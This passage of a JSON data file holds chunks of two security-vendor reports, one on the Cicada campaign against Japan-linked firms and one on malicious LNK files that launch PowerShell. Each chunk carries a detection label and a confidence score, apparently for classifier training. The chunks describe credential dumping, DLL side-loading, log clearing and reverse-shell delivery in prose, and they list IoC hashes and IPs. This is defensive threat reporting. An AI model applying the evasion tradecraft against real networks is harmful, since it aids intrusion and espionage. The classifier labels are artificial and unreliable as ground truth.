        "text": "Tactics, tools, and procedures\nWe observed the attackers using a wide variety of living-off-the-land, dual-use, and publicly available tools and techniques in these attacks, including:\n\nNetwork Reconnaissance \u2013 gathering information from machines on the network.\n Credential Theft \u2013 stealing user names and passwords, potentially to provide them with further access to the victim network.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5365234017372131
        },
        "prediction": {}
    },
    {
        "text": "Certutil \u2013 a command-line utility that can be exploited and used for various malicious purposes, such as to decode information, to download files, and to install browser root certificates.\n Adfind \u2013 a command-line tool that can be used to perform Active Directory queries.\n Csvde \u2013 can be used to extract Active Directory files and data.\n Ntdsutil \u2013 can be used as a credential-dumping tool.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.4928314983844757
        },
        "prediction": {}
    },
    {
        "text": "PowerShell - a powerful interactive command-line interface and scripting environment included in the Windows operating system.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6817491054534912
        },
        "prediction": {}
    },
    {
        "text": "It can be used to find information and execute code, and is frequently abused by malicious actors.\n\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.509858250617981
        },
        "prediction": {}
    },
    {
        "text": "The threat actors also use a legitimate cloud file-hosting service for exfiltration.\n The attackers also use DLL side-loading at multiple stages during the attack, including using it to load Backdoor.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6965266466140747
        },
        "prediction": {}
    },
    {
        "text": "DLL side-loading occurs when attackers are able to replace a legitimate library with a malicious one, allowing them to load malware into legitimate processes. Attackers use DLL side-loading to try and hide their activity by making it look legitimate, and it also helps them avoid detection by security software.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5745244026184082
        },
        "prediction": {}
    },
    {
        "text": "It is a tactic that is commonly used by APT groups and has often been observed being used by nation-state backed actors.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5749847888946533
        },
        "prediction": {}
    },
    {
        "text": "Monitoring networks for unusual activity, as Symantec\u2019s Cloud Analytics technology does, is key for detecting this kind of malicious activity.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.49134334921836853
        },
        "prediction": {}
    },
    {
        "text": "The attackers were also seen deploying a tool capable of exploiting the ZeroLogon vulnerability (CVE-2020-1472).",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6734498143196106
        },
        "prediction": {}
    },
    {
        "text": "The critical elevation-of-privilege vulnerability was first disclosed and patched on August 11, 2020, and can allow attackers to spoof a domain controller account and then potentially use it to steal domain credentials, take over the domain, and completely compromise all Active Directory identity services.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5614802837371826
        },
        "prediction": {}
    },
    {
        "text": "It has been exploited by multiple malicious actors since its disclosure, leading both Microsoft and the Department of Homeland Security\u2019s (DHS) Cybersecurity and Infrastructure Security Agency (CISA) to issue warnings to Windows users to patch the issue as quickly as possible.\n Links to Cicada\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6115836501121521
        },
        "prediction": {}
    },
    {
        "text": "The scale and sophistication of this attack campaign indicate that it is the work of a large and well-resourced group, such as a nation-state actor, with Symantec discovering enough evidence to attribute it with medium confidence to Cicada.\n ",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5923737287521362
        },
        "prediction": {}
    },
    {
        "text": "Symantec analysts have linked this activity to Cicada due to the use of previously seen obfuscation techniques and shellcode on loader DLLs.\n ",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6201755404472351
        },
        "prediction": {}
    },
    {
        "text": "Activity seen in one of the victim organizations has various trait similarities with previously seen Cicada activity that was described in a blog by Cylance in 2019, including:\n\nThird-stage DLL has an export named \"FuckYouAnti\"\nThird-stage DLL uses\u00a0CppHostCLR\u00a0technique to inject and execute the .NET loader assembly\n.NET Loader\u00a0is obfuscated with ConfuserEx v1.0.0\nFinal payload is QuasarRAT \u2013 an open-source backdoor used by Cicada in the past\n\nIn another affected organization, the loaders deploying Backdoor.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.37239381670951843
        },
        "prediction": {}
    },
    {
        "text": "Hartip overlap in the obfuscation and shellcode used, making us confident it is the same actor in both organizations.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6669761538505554
        },
        "prediction": {}
    },
    {
        "text": "Side-loading DLL\nC++ usage\nAPI call sequence\nGetModuleFileName -> lstrcat -> CreateFile -> ReadFile\nLoad next-stage payload from another file\nObfuscation: lots of garbage OutputDebugString, _time64, srand, rand API calls\n\nFigure 2.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.3009575605392456
        },
        "prediction": {}
    },
    {
        "text": "Image showing links between Cicada and two victim organizations in this campaignThese similarities leave us confident that this is the same group carrying out this activity in both organizations, and that this group is Cicada.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5641428232192993
        },
        "prediction": {}
    },
    {
        "text": "Historically, Cicada has been seen using custom DLL loaders to decrypt and execute its final payload, as is observed in these attacks.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.501930832862854
        },
        "prediction": {}
    },
    {
        "text": "We also saw similar loaders as those used in these two organizations used on other victim networks.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5467997193336487
        },
        "prediction": {}
    },
    {
        "text": "The scale of the operations also points to a group of Cicada\u2019s size and capabilities. The targeting of multiple large organizations in different geographies at the same time would require a lot of resources and skills that are generally only seen in nation-state backed groups. The link all the victims have to Japan also points towards Cicada, which has been known to target Japanese organizations in the past.\n The targeting of MSPs is also a hallmark of Cicada\u2019s activity.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5668357610702515
        },
        "prediction": {}
    },
    {
        "text": "Successfully compromising an MSP can give attackers high-level access to multiple companies without them having to compromise the individual companies\u2019 networks.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6750286817550659
        },
        "prediction": {}
    },
    {
        "text": "We have also seen Cicada utilizing some of the same publicly available tools \u2013 such as WMIExec \u2013 in the past. The attackers also take various steps to reduce the chances of their activity being spotted \u2013 including searching for security software on victim machines using WMIC, and using PowerShell to clear event logs to hide their activity once they are finished on victim machines.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6526645421981812
        },
        "prediction": {}
    },
    {
        "text": "This kind of activity is the hallmark of sophisticated and experienced threat actors.\n All of these facts point to Cicada being the perpetrator of these wide-ranging and sophisticated attacks.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.6442962884902954
        },
        "prediction": {}
    },
    {
        "text": "Intelligence gathering and stealing information has generally been the motivation behind Cicada\u2019s attacks in the past, and that would appear to be the case in this attack campaign too.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.685383677482605
        },
        "prediction": {}
    },
    {
        "text": "We observed the attackers archiving some folders of interest in these attacks, including in one organization folders relating to human resources (HR), audit and expense data, and meeting memos.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.524814784526825
        },
        "prediction": {}
    },
    {
        "text": "Conclusion\nJapan-linked organizations need to be on alert as it is clear they are a key target of this sophisticated and well-resourced group, with the automotive industry seemingly a key target in this attack campaign. However, with the wide range of industries targeted by these attacks, Japanese organizations in all sectors need to be aware that they are at risk of this kind of activity.\n Cicada clearly still has access to a lot of resources and skills to allow it to carry out a sophisticated and wide-ranging campaign like this, so the group remains highly dangerous. Its use of a tool to exploit the recently disclosed ZeroLogon vulnerability and a custom backdoor that has not been observed by Symantec before show that it continues to evolve its tools and tactics to actively target its victims.\n The group\u2019s use of techniques such as DLL side-loading and a wide array of living-off-the-land tools underline the need for organizations to have a comprehensive security solution in place to detect this kind of suspicious activity before actors like Cicada have the chance to deploy malware or steal information from their networks.\n",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.37877920269966125
        },
        "prediction": {}
    },
    {
        "text": "Protection/Mitigation\nThis activity was first discovered thanks to an alert triggered by our Cloud Analytics\u00a0technology, which is available in Symantec Endpoint Security Complete (SESC).\n Indicators of Compromise (IoCs)\n 8b6ad87e408e38fc1db868da6e643f616dac59fbae08382c4a7dd4ea119ea057\nd5e38ac1187c607e701f506c4015bde94be6c485d566d004d810d7565c188743\n26460aa2df29f766cb5712ebca44cb3365ebfdb5cae0b2ec36ef1e3568911d6a\ncdec58a57381bb8c1e374efb0bf1897d89d1e096d2b704820893859d9f08d086\nea9d994de91389280b334f2af991baa49ca613a6bf898d7bb25f88cc66488f5c\n3f5b623222c755d59052fab9e096c9d2b9a47d06b3a5de62fb9a66750af4efc4\n27873e3d4ec3a0e7d66bee8bda4d65cc8fcefbdca2c8d5c049372a63ff0bc2ed\ncf3ae16b01f7eb129e0e7387ac7feb61ecfce5db0d7494b3962c02c681f504d4\n578ea26729b43fd976365a6700c80950e0b71a39e67bfff715423d60ae6bfab9\n03ab1588acaabdb509e9db7cfe1e60522bc8baa13bbd35160b4bde7d1b6402ef\n4a08eb0eb1f4ebb54bceabbebcb7da48238f0278ae5421326ee65ec7951e4239\n178.73.210.238\n188.119.112.225\n213.252.246.245\n45.14.224.93\n45.67.230.134\n81.7.7.159\n95.179.143.32\nAbout the AuthorThreat Hunter TeamSymantecThe Threat Hunter Team is a group of security experts within Symantec whose mission is to investigate targeted attacks, drive enhanced protection in Symantec products, and offer analysis that helps customers respond to attacks.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.2036127895116806
        },
        "prediction": {}
    },
    {
        "text": "TwitterLinkedInRelated Blog PostsPosted: 29 Nov, 20235 Min ReadSpyware Employs Various Obfuscation Techniques to Bypass Static AnalysisPosted: 19 Oct, 202340 Min ReadCrambus: New Campaign Targets Middle Eastern GovernmentPosted: 10 Oct, 20236 Min ReadGrayling: Previously Unseen Threat Actor Targets Multiple Organizations in TaiwanPosted: 28 Sep, 20234 Min ReadBudworm: APT Group Uses Updated Custom Tool in Attacks on Government and Telecoms Org SubscribeFollowtwitterlinkedinPrivacy PolicyCookie PolicyData Processing and Data TransfersSupplier ResponsibilityTerms of UseSitemapCopyright \u00a9 2005-2023 Broadcom.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": false,
            "confidence": 0.1942024827003479
        },
        "prediction": {}
    },
    {
        "text": "The term \"Broadcom\" refers to Broadcom Inc. and/or its subsidiaries. Get Broadcom Software and Symantec Enterprise Latest Blog Posts In Your Inbox I accept the Terms of Use.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.5880624651908875
        },
        "prediction": {}
    },
    {
        "text": "Subscribe SubmittedClose\n\n\n\n\n\n\n\n\nBy clicking accept, you understand that we use cookies to improve your experience on our website.",
        "source": "Japan-Linked Organizations Targeted in Long-Running and Sophisticated Attack Campaign _ Symantec Enterprise Blogs.html",
        "detection": {
            "response": true,
            "confidence": 0.507786214351654
        },
        "prediction": {}
    },
    {
        "text": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nHow Attackers are Using LNK Files to Download Malware\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nBusiness\n\n\n\nsearch\nclose\n\n\n\n\n\n\n\n\n\n\nSolutions\n\n\n\nBy Challenge\n\n\n\n\n\nBy Challenge\n\n\n\n\n\nBy Challenge\nLearn more\n\n\n\n\n\n\n\n\nUnderstand, Prioritize & Mitigate Risks\n\n\n\n\n\nUnderstand, Prioritize & Mitigate Risks\nImprove your risk posture with attack surface management\nLearn more\n\n\n\n\n\n\n\n\nProtect Cloud-Native Apps\n\n\n\n\n\nProtect Cloud-Native Apps\nSecurity that enables business outcomes\nLearn more\n\n\n\n\n\n\n\n\nProtect Your Hybrid World\n\n\n\n\n\nProtect Your Hybrid, Multi-Cloud World\nGain visibility and meet business needs with security\nLearn more\n\n\n\n\n\n\n\n\nSecuring Your Borderless Workforce\n\n\n\n\n\n Securing Your Borderless Workforce\nConnect with confidence from anywhere, on any device\nLearn more\n\n\n\n\n\n\n\n\nEliminate Network Blind Spots\n\n\n\n\n\nEliminate Network Blind Spots\nSecure users and key operations throughout your environment\nLearn more\n\n\n\n\n\n\n\n\nSee More.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.28157302737236023
        },
        "prediction": {}
    },
    {
        "text": "We have seen an increase in attacks that leverage malicious LNK files that use legitimate apps\u2014like PowerShell\u2014to download malware or other malicious files.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5731755495071411
        },
        "prediction": {}
    },
    {
        "text": "By: Benson Sy\n\t\t\n\t\t\tMay 25, 2017\nRead time:\u00a05 min (1251 words)\n\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSave to Folio\n\n\n\n\n\n\n Subscribe\n\n\n\n\n\n\n\n\n\n\n\n\nUpdate as of May\u00a030, 2017, 5:00 AM\u00a0CDT\u00a0to update the date referencing\u00a0Trojan downloaders that used .zip files within .zip files from \"2016\" to \"2017\".\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.4688819944858551
        },
        "prediction": {}
    },
    {
        "text": "PowerShell is a versatile command-line and shell scripting language from Microsoft that can integrate and interact with a wide array of technologies. It runs discreetly in the background, and can be used to obtain system information without an executable file.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6081759333610535
        },
        "prediction": {}
    },
    {
        "text": "There were a few\u00a0notable instances where cybercriminals abused PowerShell: in March 2016 with the PowerWare ransomware, and in a new Fareit malware variant in April 2016.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6105312705039978
        },
        "prediction": {}
    },
    {
        "text": "Because this seemed to be an upward trend, security administrators became more familiar with how to prevent PowerShell scripts from doing any damage.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6055170297622681
        },
        "prediction": {}
    },
    {
        "text": "However, cybercriminals are staying ahead of the curve by using alternative means of executing PowerShell script\u2014Windows LNK (LNK) extensions. LNK files are usually seen by users as shortcuts, and used in places like the Desktop and Start Menu.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5946950912475586
        },
        "prediction": {}
    },
    {
        "text": "And in early 2017, we noted how Trojan downloaders used a .zip within a .zip to disguise a LNK file attachment that led to the Locky ransomware.\n Now, we\u2019re seeing an increase in attacks that leverage malicious LNK files that use legitimate apps\u2014like PowerShell\u2014to download malware or other malicious files. To illustrate how the trend of using LNK files is rising, note how one single LNK malware (identified by Trend Micro as LNK_DLOADR.*) has had a significant jump in detections since January 2017.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.46390584111213684
        },
        "prediction": {}
    },
    {
        "text": "Detected LNK_DLOADR over a 4 month period\nRecent LNK-PowerShell and ChChes attacks\nIn October 2016 we saw attackers using the combination of LNK, PowerShell, and the BKDR_ChChes malware in targeted attacks against Japanese government agencies and academics.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.551371157169342
        },
        "prediction": {}
    },
    {
        "text": "The attack used a fake .jpg extension to camouflage the malicious PowerShell file.\n\nFigure 2.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.7188340425491333
        },
        "prediction": {}
    },
    {
        "text": "In January 2017 we spotted the group APT10 (also called MenuPass, POTASSIUM, Stone Panda, Red Apollo, and CVNX) using a similar attack for a wide-spread spear phishing campaign. In this version, the LNK file executes CMD.exe, which in turn downloads a fake .jpg file hiding the malicious PowerShell script.\n The group has continued to evolve their cyberespionage activities, and in April 2017 they used a similar strategy to also download BKDR_ChChes, which is a popular malware used in targeted attacks.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.41659629344940186
        },
        "prediction": {}
    },
    {
        "text": "New LNK-PowerShell attacks\nWe identified one campaign, likely still ongoing, that has a new and complicated LNK strategy.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5538773536682129
        },
        "prediction": {}
    },
    {
        "text": "These attackers seem to be using several layers of command line, built-in, Windows tools. They send a phishing email with lures that push the victim to \u201cdouble click for content\u201d, typically a DOCX or RTF file embedded with a malicious LNK. Instead of directly executing PowerShell, the LNK file will execute MSHTA.exe (a file used for opening HTML applications), which executes a Javascript or VBScript code that in turn downloads and executes the PowerShell script. The PowerShell then executes a reverse shell (like Metasploit or Cobalt Strike) to complete the compromise.\n\nFigure 3. Complex LNK attack leveraging MSHTA.exe files\nLast month we identified another spear phishing campaign also using a combination of LNK and PowerShell.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.2741405963897705
        },
        "prediction": {}
    },
    {
        "text": "Unfortunately, the Command and Control (C&C) server where the main payload was stored is no longer accessible.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.7110875844955444
        },
        "prediction": {}
    },
    {
        "text": "Their strategy seems to have fewer layers: the LNK file is embedded in a document file and if a user double clicks to open the message, it executes a PowerShell file (or a similar Windows command line tool) to download another script.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6832202672958374
        },
        "prediction": {}
    },
    {
        "text": "A less complicated LNK-PowerShell attack\nWe believe this specific attack may be politically motivated due to the economic and controversial subject of the decoy document.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6762250661849976
        },
        "prediction": {}
    },
    {
        "text": "However, a full analysis is tricky because the trail ends when one of the C&C servers dies.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.7366387248039246
        },
        "prediction": {}
    },
    {
        "text": "Without the full picture, it is difficult to associate this type of attack to known campaigns.\n Hidden LNK commands\nIn many cases, these malicious LNK files can reveal valuable information about the attacker\u2019s development environment. To help get this information, a quick analysis is possible by viewing the properties of the file.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6618695855140686
        },
        "prediction": {}
    },
    {
        "text": "However, we are encountering cases where the command line argument is so long that it is no longer fully visible in the Properties > Shortcut window.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6861645579338074
        },
        "prediction": {}
    },
    {
        "text": "When viewed, only the target application (CMD.exe, MSHTA.exe, and other non-malicious command line applications) is seen.\n\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5679993033409119
        },
        "prediction": {}
    },
    {
        "text": "Only the target application is visible\nOur tests revealed that the maximum length for Shortcut > Properties > Target is only 260 characters.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.714604914188385
        },
        "prediction": {}
    },
    {
        "text": "Using a parser tool reveals that it is much longer (figure 6), though it still works normally:\n\nFigure 6.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5450483560562134
        },
        "prediction": {}
    },
    {
        "text": "Padded file hiding malicious code\nAttackers take advantage of this to try and disguise or hide the malicious portion of the code.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6751142740249634
        },
        "prediction": {}
    },
    {
        "text": "This padding strategy may prevent a quick analysis of a LNK file, but any LNK parser can still extract the arguments without any problem.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6747499704360962
        },
        "prediction": {}
    },
    {
        "text": "Recommendations and best practices\nMalware developers continue to upgrade their tools and look for different ways to deliver their malicious payloads.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.536376416683197
        },
        "prediction": {}
    },
    {
        "text": "Leveraging these LNK files is another strategy, but there are ways to prevent and mitigate these threats:\n\nUpgrading PowerShell to version 5, which is available as part of the Windows Management Framework and included on Windows 10, is recommended.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5780569911003113
        },
        "prediction": {}
    },
    {
        "text": "Users and enterprises alike should be wary of executable files received through email. Most files ending in *.EXE are auto-rejected on an email server, but if security is a concern then administrators should consider adding *.LNK to the list\nIt is similarly not advisable to open any LNK file received via email (or from anywhere outside your machine).\n\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.4893740713596344
        },
        "prediction": {}
    },
    {
        "text": "To identify if it is a LNK file or not:\n\nIf inside an archive (e.g. WinRAR, WinZip), the LNK extension is clearly visible, as well as the \u201cType\u201d (it says \u201cShortcut\u201d).\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6382898688316345
        },
        "prediction": {}
    },
    {
        "text": "For any Windows folder, you have to modify the registry if you want LNK files to be displayed.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.6743582487106323
        },
        "prediction": {}
    },
    {
        "text": "A small overlay arrow icon pointing to the upper right is one of the identifiers of a LNK file.",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.7235603332519531
        },
        "prediction": {}
    },
    {
        "text": "Another way to do this: switch the Windows folder to \u201cDetails View\u201d, then check the \u201cType\u201d.\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.7317711710929871
        },
        "prediction": {}
    },
    {
        "text": "For LNK embedded in Word documents, users have to be aware of these types of attacks to know what to look for. The bottom line is: never open these kinds of documents without verifying the source. If your organization does not need any packager objects, then there is a way to disable the feature totally by editing the registry.\n\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": true,
            "confidence": 0.5962687730789185
        },
        "prediction": {}
    },
    {
        "text": "Trend Micro\u2122 Smart Protection\u00a0with Maximum XGen\u2122 security infuses high-fidelity machine learning into a blend of threat protection techniques to eliminate security gaps across user activity and any endpoint\u2014the broadest possible protection against advanced attacks.\n Trend Micro\u2122 Deep Discovery\u2122 provides detection, in-depth analysis, and proactive response to today\u2019s stealthy malware and targeted attacks in real-time. It provides a comprehensive defense tailored to protect organizations against targeted attacks and advanced threats through specialized engines, custom sandboxing, and seamless correlation across the entire attack lifecycle, allowing it to detect threats, even without any engine or pattern update. \u00a0\u00a0\n\n\n\n\n\n",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.4170242249965668
        },
        "prediction": {}
    },
    {
        "text": "Tags\n\nMalware\n|\nEndpoints\n|\nResearch\n\n\n\n\n\n\t\n\t\tAuthors\n\t\n\n\n\n\n\nBenson Sy\nThreats Analyst\n\n\n\n\n\n\t\tContact Us\n\t\n\n\n\n\t\tSubscribe\n\t\n\n\n\n\n\n\nRelated Articles\n\n\n\n\t\t\t\t\tDecoding CVE-2023-50164: Unveiling the Apache Struts File Upload Exploit\n\t\t\t\t\n\n\n\n\t\t\t\t\tA Closer Look at ChatGPT's Role in Automated Malware Creation\n\t\t\t\t\n\n\n\n\t\t\t\t\tAttack Signals Possible Return of Genesis Market, Abuses Node.js, and EV Code Signing\n\t\t\t\t\n\n\n\n\n\n\n\t\t\t\tSee all articles\n\t\t\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nTry our services free for 30 days\n\n\n\n\n\n\n\t\tStart your free trial today\n\t\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nResources\n\nBlog\nNewsroom\nThreat Reports\nDevOps Resource Center\nCISO Resource Center\nFind a Partner\n\n\n\n\n\n\nSupport\n\nBusiness Support Portal\nContact Us\nDownloads\nFree Trials\n\n\n\n\n\n\n\n\nAbout Trend\n\nAbout Us\nCareers\nLocations\nUpcoming Events\nTrust Center\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSelect a country / region\n\n\nUnited States\n\n\t\t\texpand_more\n\n\nclose\n\nThe Americas\n\n\nUnited States\n\n\nBrasil\n\n\nCanada\n\n\nM\u00e9xico\n\n\n\n\nMiddle East & Africa\n\n\nSouth Africa\n\n\nMiddle East and North Africa\n\n\n\n\nEurope\n\n\nBelgi\u00eb (Belgium)\n\n\n\u010cesk\u00e1 Republika\n\n\nDanmark\n\n\nDeutschland, \u00d6sterreich Schweiz\n\n\nEspa\u00f1a\n\n\nFrance\n\n\nIreland\n\n\nItalia\n\n\nNederland\n\n\nNorge (Norway)\n\n\nPolska (Poland)\n\n\nSuomi (Finland)\n\n\nSverige (Sweden)\n\n\n  T\u00fcrkiye (Turkey)\n\n\nUnited Kingdom\n\n\n\n\nAsia & Pacific\n\n\nAustralia\n\n\n\u0426\u0435\u043d\u0442\u0440\u0430\u043b\u044c\u043d\u0430\u044f \u0410\u0437\u0438\u044f (Central Asia)\n\n\nHong Kong (English)\n\n\n\u9999\u6e2f (\u4e2d\u6587) (Hong Kong) \n\n\n\u092d\u093e\u0930\u0924 \u0917\u0923\u0930\u093e\u091c\u094d\u092f (India)\n\n\n  Indonesia\n\n\n\u65e5\u672c (Japan)\n\n\n\ub300\ud55c\ubbfc\uad6d (South Korea)\n\n\nMalaysia\n\n\n\u041c\u043e\u043d\u0433\u043e\u043b\u0438\u044f (Mongolia) and \u0440\u0443\u0437\u0438\u044f (Georgia)\n\n\nNew Zealand\n\n\nPhilippines\n\n\nSingapore\n\n\n\u53f0\u7063 (Taiwan)\n\n\n \u0e1b\u0e23\u0e30\u0e40\u0e17\u0e28\u0e44\u0e17\u0e22 (Thailand)\n\n\n ",
        "source": "How Attackers are Using LNK Files to Download Malware.html",
        "detection": {
            "response": false,
            "confidence": 0.18613339960575104
        },
        "prediction": {}
    },
    {
